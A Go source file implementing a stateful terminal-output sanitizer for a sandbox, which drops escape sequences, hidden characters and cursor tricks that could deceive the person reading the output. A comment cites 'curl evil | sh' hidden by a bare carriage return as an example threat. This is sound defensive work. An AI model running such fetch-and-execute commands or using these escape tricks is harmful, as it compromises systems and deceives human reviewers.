// Package outputfilter is the --filter-output half of the launcher
// with a host-side pty whose slave is
// the sandbox's ONLY stdio (the real host terminal fd never enters the
// sandbox), and the stateful allowlist sanitizer every byte read from
// the master passes before it reaches the host terminal.
//
// WHY a filter at all: the sandbox shares the host terminal, and output
// is INPUT to the terminal emulator — OSC 52 rewrites the clipboard,
// device status queries elicit answerback replies, cursor/erase
// sequences can forge already-reviewed output, SGR 8 (conceal) hides
// text from the human reading it, bidi overrides and zero-width
// characters deceive. --new-session (always on) blocks TIOCSTI input
// injection; this is the output-side counterpart.
//
// The sanitizer allows only:
// printable text, \n/\r/\t and SGR color/style sequences (parameter
// string [0-9;]{0,64}, no mode 8) pass; everything else — OSC/DCS/APC/
// PM/SOS strings, non-SGR CSI (cursor movement, screen clears, device
// queries), 2-byte and intermediate ESC sequences, remaining C0/C1
// controls, bidi overrides, zero-width/blank-rendering/variation-
// selector characters — is DROPPED, never rewritten. A C0 control
// interleaved inside a pending CSI/ESC sequence is EXECUTED, not
// swallowed. Decoding is stateful (incremental UTF-8, errors replaced —
// maximal invalid subsequences replaced once), so characters split across read() boundaries
// survive, and filtering is split-invariant: chunked delivery filters
// identically in both strict_cr modes, including the strict-mode \r
// one-character lookahead held across feed() boundaries.
//
// pty.go owns the pty pair and the host-terminal shims (openpty, raw
// mode, winsize forwarding, the --filter-output child-stdin decision
// and its fail-closed refusals); pump.go is the run-time pump
// (master→sanitizer→stdout, backpressured stdin forwarding, SIGWINCH).
package outputfilter

import (
	"unicode/utf8"
)

// The VT vocabulary the filter needs. CAN/SUB are the VT parser abort
// codes for a pending escape sequence.
const (
	esc rune = 0x1b
	bel rune = 0x07
	can rune = 0x18
	sub rune = 0x1a
)

// maxPendingSeq: an unterminated escape sequence is dropped wholesale
// past this many bytes, so a malformed stream cannot grow host memory
// without bound. The buffer holds decoded characters but the cap counts
// bytes (each add accounts for the UTF-8 encoding of the character).
const maxPendingSeq = 4096

// Filter states: plain text, after ESC, ESC + intermediates, inside
// CSI, inside a string (OSC/DCS/APC/PM/SOS), and the ESC seen inside
// one.
type filterState int

const (
	fPlain filterState = iota
	fEsc
	fEscInt
	fCsi
	fStr
	fStrEsc
)

// stringOpeners: ESC ] OSC, ESC P DCS, ESC _ APC, ESC ^ PM, ESC X SOS —
// all dropped wholesale (clipboard writes, titles, hyperlinks,
// queries, ...).
const stringOpeners = "]P_^X"

// charAllowed is the allowlist for a plain (non-escape) character:
// printable text only. \n \r \t are handled
// by the caller; everything refused here is dropped — remaining C0
// controls, DEL, C1 controls (U+0080..U+009F, including the
// single-character CSI U+009B and OSC U+009D), bidi overrides,
// zero-width/invisible characters, blank-rendering fillers, variation
// selectors and the combining grapheme joiner (invisible Mn code points
// that can smuggle hidden bytes through copy-paste; U+FE0F emoji
// presentation is the one kept), and anything else non-printable (NBSP,
// soft hyphen, ...). C1 bytes are NOT interpreted as sequence
// initiators — they never start a valid UTF-8 escape.
//
// Printable categories are letters, marks, numbers, punctuation,
// symbols and ASCII space. The Go toolchain supplies the Unicode table.
func charAllowed(ch rune) bool {
	o := uint32(ch)
	if o < 0x20 || (o >= 0x7F && o <= 0x9F) {
		return false
	}
	if o >= 0x200B && o <= 0x200F { // ZWSP ZWNJ ZWJ LRM RLM
		return false
	}
	if o >= 0x202A && o <= 0x202E { // bidi overrides LRE RLE PDF LRO RLO
		return false
	}
	switch o {
	case 0x2060, 0x2066, 0x2067, 0x2068, 0x2069, 0xFEFF:
		return false // word joiner, LRI RLI FSI PDI, BOM
	case 0x115F, 0x1160, 0x2800, 0x3164, 0xFFA0:
		// blank-rendering fillers (Hangul Choseong/Jungseong/filler,
		// Braille blank, HW filler): printable per isprintable() but
		// render as empty space — spoofing
		return false
	case 0x034F:
		// combining grapheme joiner: invisible (category Mn passes
		// isprintable())
		return false
	}
	if (o >= 0xFE00 && o <= 0xFE0E) || (o >= 0xE0100 && o <= 0xE01EF) {
		// variation selectors: invisible Mn runs can smuggle bytes
		// through copy-paste; U+FE0F (emoji presentation) is KEPT —
		// it is ubiquitous and renders as nothing harmful on its own
		return false
	}
	return isPrintable(ch)
}

// sgrConceals reports whether an SGR parameter string sets mode 8
// (conceal/invisible). 38/48 (extended fg/bg
// color) take subparameters — '38;5;8' selects color index 8, not
// conceal — so their arguments are skipped, walking the string exactly
// like a terminal does. Unknown extended forms degrade to scanning
// every remaining parameter (fail-safe: the whole sequence is dropped).
// Leading zeros count ('08' is 8).
func sgrConceals(params string) bool {
	parts := splitParams(params)
	i := 0
	for i < len(parts) {
		p := parts[i]
		if stripLeadingZeros(p) == "8" {
			return true
		}
		if (p == "38" || p == "48") && i+1 < len(parts) &&
			(parts[i+1] == "5" || parts[i+1] == "2") {
			if parts[i+1] == "5" {
				i += 3 // 38;5;N
			} else {
				i += 5 // 38;2;R;G;B
			}
			continue
		}
		i++
	}
	return false
}

func splitParams(params string) []string {
	var out []string
	start := 0
	for i := 0; i <= len(params); i++ {
		if i == len(params) || params[i] == ';' {
			out = append(out, params[start:i])
			start = i + 1
		}
	}
	return out
}

func stripLeadingZeros(p string) string {
	i := 0
	for i < len(p) && p[i] == '0' {
		i++
	}
	return p[i:]
}

// sgrParamsOK checks the parameter string between "\x1b[" and the final byte:
// must be digits and semicolons, at most 64 chars. Every other CSI
// body (private markers like '?', intermediates, ':' subparameters)
// fails it and is dropped.
func sgrParamsOK(params string) bool {
	if len(params) > 64 {
		return false
	}
	for i := 0; i < len(params); i++ {
		c := params[i]
		if (c < '0' || c > '9') && c != ';' {
			return false
		}
	}
	return true
}

// Sanitizer is the stateful allowlist filter for sandbox terminal
// output. Feed takes raw bytes read from
// the pty master and returns the text that is safe to show on the host
// terminal. Decoding is stateful (incremental UTF-8, errors replaced),
// so multibyte characters split across read() boundaries survive; a
// trailing incomplete escape sequence is held back until its final byte
// arrives in a later chunk (or the byte cap drops it).
//
// Allowed: printable text, \n, \r, \t, and SGR color/style sequences
// whose parameter string is [0-9;]{0,64} and sets no mode 8. Everything
// else is dropped silently. A C0 control interleaved inside a pending
// CSI/ESC sequence is EXECUTED, not swallowed (\n/\r/\t pass, the rest
// drop, the sequence keeps waiting) — a stray ESC before a \n must not
// eat the newline.
//
// strictCr=true additionally drops every \r that is not immediately
// followed by \n: a bare \r moves the cursor to column 0, so payload
// output can visually overwrite the current line after you read it
// ("curl evil | sh\r" + "ok"). The decision needs one character of
// lookahead, so a trailing \r is held across Feed boundaries and
// dropped at Flush — chunked delivery filters identically either way.
// This breaks progress bars and any \r-relying redraw, hence the opt-in.
type Sanitizer struct {
	strictCr  bool
	crPending bool // strict mode: a \r awaiting its next byte
	dec       incDecoder
	state     filterState
	seq       []rune
	seqLen    int // bytes (not codepoints) held in seq
}

// NewSanitizer returns a sanitizer; strictCr enables the bare-\r drop
// (--strict-crlf, a --filter-output mode).
func NewSanitizer(strictCr bool) *Sanitizer {
	return &Sanitizer{strictCr: strictCr}
}

// seqStart begins a new pending sequence holding ch (its UTF-8 byte
// length seeds the cap counter).
func (s *Sanitizer) seqStart(ch rune, state filterState) {
	s.seq = []rune{ch}
	s.seqLen = runeLen(ch)
	s.state = state
}

// seqAdd extends the pending sequence, dropping it wholesale past the
// byte cap (malformed stream: drop, never grow unbounded).
func (s *Sanitizer) seqAdd(ch rune) {
	s.seq = append(s.seq, ch)
	s.seqLen += runeLen(ch)
	if s.seqLen > maxPendingSeq {
		s.seqDrop()
	}
}

func (s *Sanitizer) seqDrop() {
	s.seq = nil
	s.seqLen = 0
	s.state = fPlain
}

func runeLen(ch rune) int {
	if n := utf8.RuneLen(ch); n > 0 {
		return n
	}
	return 1 // unreachable: the decoder never emits invalid runes
}

// Feed filters one read() chunk. Stateful UTF-8 decoding with
// errors='replace' keeps split multibyte characters intact.
func (s *Sanitizer) Feed(data []byte) string {
	return s.filter(s.dec.decode(data, false))
}

// Flush ends the stream: decode leftovers (as U+FFFD), then a sequence
// that never terminated is dropped — it is malformed by definition —
// and a trailing bare \r never finds its \n.
func (s *Sanitizer) Flush() string {
	text := s.filter(s.dec.decode(nil, true))
	s.seqDrop()
	s.crPending = false
	return text
}

// finishCsi consumes a completed CSI sequence: only an SGR final byte
// ('m') with a valid, non-concealing parameter string passes.
func (s *Sanitizer) finishCsi(final rune, out *[]rune) {
	seq := s.seq
	params := ""
	if len(seq) >= 3 { // between "\x1b[" and the final byte
		params = string(seq[2 : len(seq)-1])
	}
	s.seqDrop() // consumed either way
	if final == 'm' && sgrParamsOK(params) && !sgrConceals(params) {
		*out = append(*out, seq...)
	}
	// else: non-SGR CSI (cursor, clears, device queries, private
	// markers) or a malformed/concealing SGR — dropped
}

// executeC0: a C0 control (or DEL) interleaved in a pending sequence is
// EXECUTED, like a real terminal (VT parsers run C0 controls even
// inside escape sequences) instead of swallowed: a stray ESC used to
// eat a following \n AND the next printable character (which was then
// consumed as the sequence's final byte). Allowed controls (\n \r \t)
// pass — strictCr defers \r with the same one-byte lookahead as in
// plain text — the rest drop, and the sequence state is left untouched.
func (s *Sanitizer) executeC0(ch rune, out *[]rune) {
	if ch == '\r' && s.strictCr {
		s.crPending = true
	} else if ch == '\n' || ch == '\r' || ch == '\t' {
		*out = append(*out, ch)
	}
}

func (s *Sanitizer) filter(text string) string {
	var out []rune
	for _, ch := range text {
		if s.crPending {
			// strict mode: the previous \r is only emitted when THIS
			// character is \n; anything else means it was a bare \r.
			s.crPending = false
			if ch == '\n' {
				out = append(out, '\r') // then \n flows through below
			}
		}
		switch s.state {
		case fPlain:
			switch {
			case ch == esc:
				s.seqStart(esc, fEsc)
			case ch == '\r' && s.strictCr:
				s.crPending = true // decide on the next character
			case ch == '\n' || ch == '\r' || ch == '\t' || charAllowed(ch):
				out = append(out, ch)
			default:
				// dropped: C0/C1 controls, DEL, bidi overrides,
				// zero-width and other non-printable characters
			}
		case fEsc:
			o := ch
			switch {
			case ch == '[':
				s.seqAdd(ch)
				s.state = fCsi
			case isStringOpener(ch):
				s.seqAdd(ch)
				s.state = fStr
			case ch == esc:
				s.seqStart(esc, fEsc) // restart on a new ESC
			case ch == can || ch == sub:
				s.seqDrop()
			case o >= 0x20 && o <= 0x2F: // intermediates, e.g. ESC ( B
				s.seqAdd(ch)
				s.state = fEscInt
			case o >= 0x30 && o <= 0x7E: // 2-byte escape: never allowed
				s.seqDrop()
			case o < 0x20 || o == 0x7F:
				s.executeC0(ch, &out) // stray C0/DEL: executed, not eaten
			default:
				// anything else (C1, non-ASCII): swallowed, keep
				// waiting for the sequence to complete (or the cap)
			}
		case fEscInt:
			o := ch
			switch {
			case ch == esc:
				s.seqStart(esc, fEsc)
			case ch == can || ch == sub:
				s.seqDrop()
			case o >= 0x20 && o <= 0x2F:
				s.seqAdd(ch) // further intermediates
			case o >= 0x30 && o <= 0x7E: // final byte: charset etc. — dropped
				s.seqDrop()
			case o < 0x20 || o == 0x7F:
				s.executeC0(ch, &out)
			default:
				// else swallowed
			}
		case fCsi:
			o := ch
			switch {
			case o >= 0x40 && o <= 0x7E: // final byte terminates
				s.seqAdd(ch)
				s.finishCsi(ch, &out)
			case ch == esc:
				s.seqStart(esc, fEsc) // abort, restart
			case ch == can || ch == sub:
				s.seqDrop()
			case o >= 0x20 && o <= 0x3F: // parameter bytes + intermediates
				s.seqAdd(ch)
			case o < 0x20 || o == 0x7F:
				s.executeC0(ch, &out)
			default:
				// else swallowed (stray C1/DEL/non-ASCII in the body)
			}
		case fStr:
			switch {
			case ch == bel: // OSC-BEL terminator
				s.seqDrop()
			case ch == esc:
				s.seqAdd(ch)
				s.state = fStrEsc
			case ch == can || ch == sub:
				s.seqDrop()
			default: // string content: collected only to be dropped
				s.seqAdd(ch)
			}
		default: // fStrEsc: ESC inside a string, maybe a ST (ESC \)
			switch {
			case ch == '\\':
				s.seqDrop() // ST: properly terminated — dropped
			case ch == can || ch == sub:
				s.seqDrop()
			case ch == esc:
				// another ESC: still not a terminator
			default: // not a terminator after all: back to content
				s.seqAdd(ch)
				s.state = fStr
			}
		}
	}
	return string(out)
}

func isStringOpener(ch rune) bool {
	for _, o := range stringOpeners {
		if ch == o {
			return true
		}
	}
	return false
}
